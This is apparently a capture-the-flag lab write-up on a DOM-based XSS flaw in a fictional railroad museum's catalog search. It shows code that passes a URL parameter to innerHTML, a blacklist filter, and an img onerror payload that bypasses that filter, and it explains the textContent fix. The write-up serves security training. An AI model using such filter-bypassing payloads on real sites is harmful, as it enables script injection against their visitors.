---

Name: The Roundhouse Society
Difficulty: Medium
URL: https://dashboard.webverselabs-pro.com/learning-paths/junior-web-hacker/07/flag-stop
Description: The Roundhouse Society is a small heritage-railroad museum, chartered in 1973 and run almost entirely by volunteers. Three operating steam locomotives, a working roundhouse, weekend service April through October, admission $14. A retired signals engineer rewrote the catalog page over a winter, he was proud that the server stayed dumb and the "live feel" of the search box ran entirely in the visitor's browser. The URL, he liked to point out, was the whole state of the page. 

---

## Enumeration

The challenge provides a catalog search feature through the `q` URL parameter:

```text
/catalog.php?q=test
```

The description mentions that the search functionality runs entirely in the browser, so I inspected the JavaScript responsible for rendering the results.

The important section was:

```javascript
const params = new URLSearchParams(location.search);
const q = params.get('q');

if (!q) {
    return;
}

header.innerHTML = 'Results for "' + q + '"';
```

The value of `q` is taken directly from the URL and inserted into the page using `innerHTML`.

This is potentially vulnerable to **DOM-based Cross-Site Scripting (XSS)** because `innerHTML` causes the browser to interpret the supplied value as HTML.

## Testing the Filter

I first tried a normal `<script>` payload:

```html
<script>alert("Hacked")</script>
```

However, it was filtered and the application displayed:

```text
Results for ""
```

I found that several strings were being removed, including:

```text
<sc
<s
<i
```

This suggested that the application was using a simple blacklist rather than safely encoding the input.

Instead of trying to bypass the filter with a `<script>` tag, I looked for another HTML element capable of executing JavaScript through an event handler.

## Exploitation

An `<img>` element with an `onerror` handler works because it does not contain the filtered `<s` or `<i` prefixes.

The payload was:

```html
<img src=x onerror=alert("Hacked")>
```

When supplied as the `q` parameter, the JavaScript effectively performs:

```javascript
header.innerHTML =
    'Results for "<img src=x onerror=alert("Hacked")>"';
```

The browser interprets the injected value as HTML and creates an `<img>` element.

Because `src=x` does not point to a valid image, the image fails to load and triggers the `onerror` handler:

```javascript
alert("Hacked")
```

This confirms JavaScript execution.

## Why It Works

The vulnerability exists because attacker-controlled data is passed directly to `innerHTML`:

```javascript
header.innerHTML = 'Results for "' + q + '"';
```

If the application instead used:

```javascript
header.textContent = 'Results for "' + q + '"';
```

the browser would treat the payload as plain text rather than parsing it as HTML.

The blacklist also provides inadequate protection. Blocking specific strings such as `<script>`, `<s`, or `<i>` does not prevent other HTML elements from executing JavaScript through event handlers.

The successful payload was:

```html
<img src=x onerror=alert("Hacked")>
```

which confirms a **DOM-based XSS vulnerability** in the catalog search functionality.
